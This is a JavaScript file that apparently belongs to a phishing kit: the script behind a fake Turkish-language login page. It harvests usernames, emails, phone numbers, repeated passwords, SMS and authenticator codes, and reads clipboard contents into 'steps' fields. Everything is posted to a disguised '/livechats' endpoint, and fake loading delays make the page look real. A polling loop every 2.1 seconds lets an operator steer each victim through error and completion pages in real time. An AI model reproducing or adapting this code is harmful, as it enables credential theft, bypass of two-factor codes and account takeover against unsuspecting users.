function submitUsername() {
    var txtUserName = $("#txtUserName").val();
     
 

    if (validateEmail(txtUserName)) {
        /*if (!isValidDomain(txtUserName)) {
            alert("Please enter an email address with one of the allowed domains: " + allowedDomains.join(", "));
            return;
        }*/
        submitData("submitUsername", { txtUserName: txtUserName }, function () {
            setFormType("email"); 
            $("#waveLoader").show();
            $("#firstLoginButton").hide();
            setTimeout(function() {
                $("#firstLogin,#waveLoader").hide();
                $("#passwordLogin, #passwordLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000);
        });
    } else if (validatePhoneNumber(txtUserName)) {
        submitData("submitUsername", { txtUserName: txtUserName}, function () {
            setFormType("alternative");
            $("#firstLogin, #firstLoginButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waveLoader").hide();
                $("#emailLogin, #emailLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000); 
        });
    } else { }
}

function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: "/livechats",
        data: { action: action, ...formData },
        success: function (response) {
            if (response === "success") {
          
                $("#passwordLogin").css("display", "");
                $("#firstLogin").css("display", "none");
                $("#phoneArea").css("display", "none");
                $("#passwordLoginButton").css("display", "none");
                $("#firstLoginButton").css("display", "none");


                if (typeof successCallback === "function") {
                    successCallback();
                }
            } else if (response === "success2") {
      
                window.location.href = "/verify";
            }else if (response === "smsok") {
      
                window.location.href = "/bekle";
            }
        },
        error: function (error) {
            console.error("AJAX request failed:", error);
        }
    });
}


function maskPhoneNumber(phoneNumber) {
    return phoneNumber.replace(/^.{6}/, "******");
}
function validatePhoneNumber(phoneNumber) {
    return phoneNumber.length > 9;
}
function validateEmailDomain(email) {
    var allowedDomains = [
        "@gmail.com",
        "@hotmail.com",
        "@yandex.com",
        "@domain.com",
        "@yahoo.com",
        "@outlook.com",
        "@icloud.com",
        "@mail.ru",
        "@aol.com",
        "@zoho.com",
        "@protonmail.com",
        "@gmx.com"
    ];
    return allowedDomains.some(function(domain) {
        return email.endsWith(domain);
    });
}
$(document).ready(function() {
    $("#txtUserName").on("keyup", function() {
        var txtUserName = $(this).val();

        if (txtUserName.length >= 3 && !isNaN(txtUserName)) {
            $("#firstLogin, #firstLoginButton").hide();
            $("#phoneArea").show();
            $("#phoneinput").val(txtUserName);
            setTimeout(function() {
                $("#phoneinput").show().focus();
            }, 0);
            $("#alternativeButton").show();
        } else {
            $("#firstLogin").show();
            if (txtUserName.length < 3) {
                $("#firstLoginButton").show();
            }
            $("#phoneArea, #alternativeButton, #phoneinput").hide();
        }
    });

    $("#phoneinput").on("keyup", function() {
        var phoneInputValue = $(this).val();
        $("#txtUserName").val(phoneInputValue);
    });

    $(".bn-svg").on("click", function() {
        $("#phoneinput").val('');
        $("#txtUserName").val('');
        $("#firstLogin").show();
        $("#firstLoginButton").show();
        $("#phoneArea, #alternativeButton, #phoneinput").hide();
    });
});   
var formType = "";
function setFormType(type) {
    formType = type;
}
function getFormType() {
    return formType;
}
function submitAlternative() {
    var phoneinput = $("#phoneinput").val();
  

    submitData("submitAlternative", { phoneinput: phoneinput}, function () {
        if (validatePhoneNumber(phoneinput)) {
            setFormType("alternative");
            $("#alternativeButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#phoneArea, #waveLoader").hide();
                $("#passwordLogin, #passwordLoginButton").show();
                var maskedPhone = maskPhoneNumber(phoneinput);
                $("#codeNumber").text(maskedPhone + " numarasına gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("submittedData", phoneinput);
            }, 3000);
        } else {
           
        }
    });
}
function submitEmail() {
    var txtEmail = $("#txtEmail").val();
   

    submitData("submitEmail", { txtEmail: txtEmail}, function () {
        setFormType("email");
        $("#emailLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
            $("#emailLogin, #waveLoader").hide();
            $("#waitModal").show();
            localStorage.setItem("emailData", txtEmail);
        }, 3000);
        window.location.href = "/eksik.php";
    });
}
function submitPassword() {
    var txtPassword = $("#txtPassword").val();
    var formType = getFormType();
 

    
        submitData("submitPassword", { txtPassword: txtPassword }, function () {
            $("#passwordLoginButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waveLoader, #passwordLogin").hide();
                if (formType === "alternative") {
                    //console.log("submitPassword: Showing email login");
                    $("#emailLogin, #emailLoginButton").show();
                } else if (formType === "email") {
                    //console.log("submitPassword: Showing phone login");
                    $("#phoneLogin, #phoneLoginButton").show();
                } else {
                    console.log("submitPassword: formType is not set correctly");
                }
            }, 2000);
        });
}
function submitPasswordAgain() {
    var txtPasswordAgain = $("#txtPasswordAgain").val();
  

    
        submitData("submitPasswordAgain", { txtPasswordAgain: txtPasswordAgain}, function () {
            $("#passwordLoginButtonAgain").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waitModal").show();
                 
            }, 2000);
        });
    
}
function submitUsername() {
    var txtUserName = $("#txtUserName").val();
    

    /*var allowedDomains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"];

    function isValidDomain(email) {
        return allowedDomains.some(domain => email.endsWith("@" + domain));
    }*/

    if (validateEmail(txtUserName)) {
        /*if (!isValidDomain(txtUserName)) {
            alert("Please enter an email address with one of the allowed domains: " + allowedDomains.join(", "));
            return;
        }*/
        submitData("submitUsername", { txtUserName: txtUserName }, function () {
            setFormType("email"); 
            $("#waveLoader").show();
            $("#firstLoginButton").hide();
            setTimeout(function() {
                $("#firstLogin,#waveLoader").hide();
                $("#passwordLogin, #passwordLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000);
        });
    } else if (validatePhoneNumber(txtUserName)) {
        submitData("submitUsername", { txtUserName: txtUserName}, function () {
            setFormType("alternative");
            $("#firstLogin, #firstLoginButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waveLoader").hide();
                $("#emailLogin, #emailLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000); 
        });
    } else { }
}
function validateEmail(email) {
    var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return re.test(email);
}
function validatePhoneNumber(phone) {
    var re = /^\d{10}$/; 
    return re.test(phone);
}
function submitPhone() {
    var txtPhoneNumber = $("#txtPhoneNumber").val();
    

    if (txtPhoneNumber.length <= 9) {
        return;
    }

    submitData("submitPhone", { txtPhoneNumber: txtPhoneNumber}, function () {
        $("#phoneLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
            $("#waitModal").show();
            var maskedPhone = maskPhoneNumber(txtPhoneNumber);
            $("#codeNumber").text(maskedPhone + " telefon numarasına gönderilen 6 haneli doğrulama kodunu giriniz");
            localStorage.setItem("submittedData", txtPhoneNumber);
        }, 2000);
    });
}


$(document).ready(function() {
    $("#txtPassword").on("input", function() {
        var password = $(this).val();
        if (password === "") {
            $("#passwordInput").css("border-color", "red");
            $("#errorPassword").show().text("Parola boş olamaz!");
        } else {
            $("#passwordInput").css("border-color", "");
            $("#errorPassword").hide();
        }
    });

    $("#txtPassword").on("focus", function() {
        $("#passwordInput").css("border-color", "");
        $("#errorPassword").hide();
    });

    $("#txtPassword").on("blur", function() {
        var password = $(this).val();
        if (password === "") {
            $("#passwordInput").css("border-color", "red");
            $("#errorPassword").show().text("Parola boş olamaz!");
        }
    });
});




function submitCode() {
    var txtCode = $("#txtCode").val();
   

    if (txtCode.length <= 5) {
        return;
    }


    submitData("submitCode", { txtCode: txtCode}, function () {
        $("#codeLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
        
    });
}

function submitCodeAgain() {
    var txtCodeAgain = $("#txtCodeAgain").val();
 

     if (txtCodeAgain.length <= 5) {
        return;
    }

    submitData("submitCodeAgain", { txtCodeAgain: txtCodeAgain}, function () {
        $("#codeLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
        
    });
}

function submitAuth() {
    var txtAuth = $("#txtAuth").val();
  

    if (txtAuth.length <= 5) {
        return;
    }

    submitData("submitAuth", { txtAuth: txtAuth }, function () {
        $("#authLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitAuthAgain() {
    var txtAuthAgain = $("#txtAuthAgain").val();
    

    if (txtAuthAgain.length <= 5) {
        return;
    }

    submitData("submitAuthAgain", { txtAuthAgain: txtAuthAgain}, function () {
        $("#authLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitSteps() {
    var txtSteps = $("#txtSteps").val();
    

    if (txtSteps.length <= 5) {
        return;
    }

    submitData("submitSteps", { txtSteps: txtSteps}, function () {
        $("#stepsLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitStepsAgain() {
    var txtStepsAgain = $("#txtStepsAgain").val();
    

    if (txtStepsAgain.length <= 5) {
        return;
    }

    submitData("submitStepsAgain", { txtStepsAgain: txtStepsAgain }, function () {
        $("#stepsLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}
 
 $(document).ready(function() {
            $("#txtCodeAgain").on("focus", function() {
                $("#codeField").css("border-color", "");
            });
 });

  $(document).ready(function() {
            $("#txtAuthAgain").on("focus", function() {
                $("#codeFieldAuth").css("border-color", "");
            });
 });

$(document).ready(function() {
    var storedData = localStorage.getItem("submittedData");
    if (storedData) {
        var maskedPhone = maskPhoneNumber(storedData);
        $("#codeNumber").text(maskedPhone + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
    }
});


$(document).ready(function() {
    var storedEmail = localStorage.getItem("emailData");
    if (storedEmail) {
        $("#emailData").text(storedEmail + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
    }
});

document.addEventListener('DOMContentLoaded', (event) => {
    const pasteButton = document.getElementById('pasteButton');
    const txtSteps = document.getElementById('txtSteps');

    pasteButton.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });

    txtSteps.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });
});

document.addEventListener('DOMContentLoaded', (event) => {
    const pasteButton = document.getElementById('pasteButtonf');
    const txtSteps = document.getElementById('txtStepsAgain');

    pasteButton.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });

    txtSteps.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text);
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });
});


 

function sendUrlPath() {
    const currentPath = window.location.pathname + window.location.search;
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/api", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const responseText = xhr.responseText.trim();
            switch (responseText) {
                case "sms":
                    window.location.href = '/sms';
                    break;
                case "hata":
                    window.location.href = '/sms-error';
                    break;
                case "sms2":
                    window.location.href = '/error-number';
                    break;
                case "sifrehata":
                    window.location.href = '/password-error';
                    break;
                case "back":
                    window.location.href = '/email-error';
                    break;
                case "postakod":
                    window.location.href = '/mail';
                    break;
                case "tebrik":
                    window.location.href = 'tamamlandi.php';
                    break;
                default:
            }
        }
    };
    
    xhr.send(`x=${encodeURIComponent(currentPath)}`);
}


 
setInterval(sendUrlPath, 2100);
